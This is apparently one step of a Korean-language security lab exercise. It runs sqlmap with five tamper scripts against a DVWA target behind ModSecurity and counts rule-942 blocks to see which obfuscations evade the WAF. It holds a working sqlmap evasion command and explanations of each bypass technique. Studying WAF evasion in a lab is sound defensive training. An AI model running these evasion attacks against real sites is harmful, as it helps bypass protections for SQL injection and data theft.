  - order: 2
    instruction: |
      ## 🎯 MISSION — 5 tamper script × ModSec 942 우회 매트릭스

      sqlmap 의 *5 tamper script* (space2comment / randomcase / between / charunicodeescape
      / apostrophenullencode) 각 의 *942 우회 가능 여부* + sqlmap 결론 매트릭스.

      ## 📚 사전 학습 (학생 혼돈 방지)

      - **tamper script** = sqlmap 의 *payload 변형* — *동일 의도* 의 *다른 형식*
      - **--tamper=a,b,c** = *복수 tamper* 의 chained 적용
      - **5 대표 tamper**:
        - `space2comment` = space → `/**/` (comment)
        - `randomcase` = SELECT → SeLeCt (regex `(?i)` 누락 우회)
        - `between` = `=` → `BETWEEN` (operator 우회)
        - `charunicodeescape` = char → unicode escape
        - `apostrophenullencode` = `'` → `%00%27`

      ## 💻 실행 명령

      ```bash
      ssh 6v6-attacker bash <<'SH'
      BEFORE=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")

      for tamper in space2comment randomcase between charunicodeescape apostrophenullencode; do
        echo "=== tamper: $tamper ==="
        timeout 30 sqlmap -u "http://10.20.30.1/?id=1" \
          --headers="Host: dvwa.6v6.lab" \
          --tamper=$tamper \
          --batch --level=1 --risk=1 --threads=1 2>&1 | tail -3
        echo ""
      done

      AFTER=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")
      echo "942 차단 증가: $((AFTER - BEFORE))"
      SH
      ```

      ## 📋 확인 사항

      - 5 tamper 각 의 sqlmap 결론 (vulnerable / not vulnerable)
      - 942 차단 카운트 증가 = 5 × N (N = tamper 별 payload 수)
      - 어떤 tamper 가 *우회 가능* 인지 식별

      ## 💡 왜 이걸 하는가?

      WAF (ModSec) 의 *룰 의 한계* — *정규식 기반* 차단 의 *변형 우회* 가능. *5
      tamper* 의 *각 메커니즘* 인지 → custom tamper 작성 의 기반.

      ## 🔍 결과 해석

      - **정상 (vuln WAF)**: 일부 tamper 가 *우회* — 즉시 *paranoia 상승* 또는 *libinjection*
      - **모두 차단 (강력 WAF)**: paranoia 1 의 *충분* — 단 *paranoia 2-3* 의 *false positive trade-off*
      - **942 카운트 증가 X**: ModSec 비활성 또는 audit log 비활성

      ## 비정상 시 대응

      - **tamper 미인식**: sqlmap version 확인 (1.6+ 필요)
      - **모든 tamper 같은 결과**: --level 2-3 + --risk 2-3 으로 *더 적극 시도*
